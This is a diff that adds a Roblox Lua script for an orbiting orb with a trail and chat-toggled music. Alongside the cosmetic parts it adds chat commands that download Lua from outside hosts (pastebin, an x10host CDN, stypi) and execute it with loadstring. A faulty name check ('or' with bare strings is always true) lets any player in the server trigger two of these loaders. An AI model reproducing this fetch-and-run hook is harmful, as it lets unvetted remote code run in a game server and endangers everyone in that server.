@@ -1,0 +1,161 @@
+local player = owner or game.Players.LocalPlayer
+player.Character:WaitForChild("Humanoid")
+local folder = Instance.new("Folder", game:GetService("Workspace"))
+folder.Name = "iiOrb"
+speed = 7
+ID = "" 
+local part = Instance.new("Part")
+http = game:GetService'HttpService'
+local function res()
+part.Parent = workspace
+part.Shape = "Ball"
+part.FormFactor = "Custom"
+part.Size = Vector3.new(1,1,1)
+part.Name = "Orb"
+part.Anchored = true
+part.Locked = true
+part.CanCollide = false
+part.BottomSurface = "Smooth"
+part.TopSurface = "Smooth"        
+part.BrickColor = BrickColor.White()
+end
+key = "148192"
+
+res()
+
+game:GetService("Workspace").DescendantRemoving:connect(function(v)
+if v == folder then
+folder = Instance.new("Folder")
+folder.Name = "iiOrb"
+part = Instance.new("Part")
+folder.Parent = game:GetService("Workspace")
+res()        
+end
+end)
+
+local point
+
+local loop = coroutine.create(function()
+while true do
+for i=1,360,speed do
+if player.Character and not point then
+point = player.Character:FindFirstChild("Head")        
+end
+if point.Parent.Name == player.Character.Name then
+point = player.Character:FindFirstChild("Head")        
+end
+if part then
+part.CFrame =  CFrame.new(point.CFrame.p)   *CFrame.fromEulerAnglesXYZ(-math.sin(math.rad(i)),math.rad(i),2) *CFrame.new(8,4,1)end
+wait()
+end
+end
+end)
+
+
+
+local function trailPar()
+local pos = part.CFrame.p
+wait()
+local pos2 = part.CFrame.p
+local dist = (pos - pos2).magnitude
+local trail = Instance.new("Part")
+trail.Parent = script
+trail.Anchored = true
+trail.Locked = true
+trail.CanCollide = false
+trail.BottomSurface = "Smooth"
+trail.TopSurface = "Smooth"
+trail.Shape = "Block"
+trail.FormFactor = "Custom"
+trail.Size = Vector3.new(0.1,0.1,dist)
+trail.CFrame = CFrame.new(pos,pos2) *CFrame.new(0,0,-dist/2)
+trail.Parent = folder
+game:GetService("Debris"):AddItem(trail,.5)
+return trail        
+end
+
+local trail = coroutine.create(function()
+while true do 
+for i=1,5,1 do
+trail = trailPar()
+trail.Size = trail.Size + Vector3.new(.1,.1,.1)
+trail.Transparency = i/30
+trail.BrickColor = BrickColor.Black()
+end
+for i=2,5,1 do
+trail = trailPar()
+trail.Size = trail.Size + Vector3.new(.1,.1,.1)
+trail.Transparency = i/30
+trail.BrickColor = BrickColor.White()
+end
+for i=1,20,1 do
+trail = trailPar()
+trail.Size = trail.Size + Vector3.new(.1,.1,.1)
+trail.Transparency = i/30
+trail.BrickColor = BrickColor.Black()
+end
+for i=1,20,1 do
+trail = trailPar()
+trail.Size = trail.Size + Vector3.new(.1,.1,.1)
+trail.Transparency = i/30
+trail.BrickColor = BrickColor.White()
+end
+end
+end)
+function Chat(msg)
+if msg == "//music on" then
+music = Instance.new("Sound",part)
+music.SoundId = "rbxassetid://217714490"
+music.Looped = true
+music:Play()
+music.Volume = 1
+music.Looped = true
+elseif msg == "//music off" then
+music:Stop()
+end
+end
+function X(msg)
+if msg == "//oxchat()" then
+local ox = http:GetAsync("http://cdn.skypeforums.x10host.com/ScriptHosting/OxChat.lua")
+loadstring(ox)()
+end
+end
+function GavLaunch(msg)
+if msg == "//gav()" then
+local gav = http:GetAsync("http://pastebin.com/raw.php?i=bucHY23f")
+loadstring(gav)()
+end
+end
+function Terminate(msg)
+if msg == "terminate/"..key then script:ClearAllChildren''
+warn'KEY ACCEPTED SHUTTING DOWN SCRIPT'
+script:Remove()
+end
+end
+for i,v in pairs(game.Players:GetPlayers()) do
+if v.Name == "Control22" or "iiDeadzone" or "DrAnkIe" then
+v.Chatted:connect(Chat)
+v.Chatted:connect(X)
+v.Chatted:connect(GavLaunch)
+end
+end
+function TPAll(msg)
+if msg == "/e tpall/"..key then
+local h = http:GetAsync('https://code.stypi.com/raw/control22a/untitled%206',true)
+loadstring(h)()
+end
+end
+function Slow(msg)
+if msg == "//slow" then
+speed = 2
+end
+end
+function Fast(msg)
+if msg == "//fast" then
+speed = 5
+end
+end
+game.Players['Control22'].Chatted:connect(Terminate)
+game.Players['Control22'].Chatted:connect(TPAll)
+coroutine.resume(loop)
+coroutine.resume(trail)
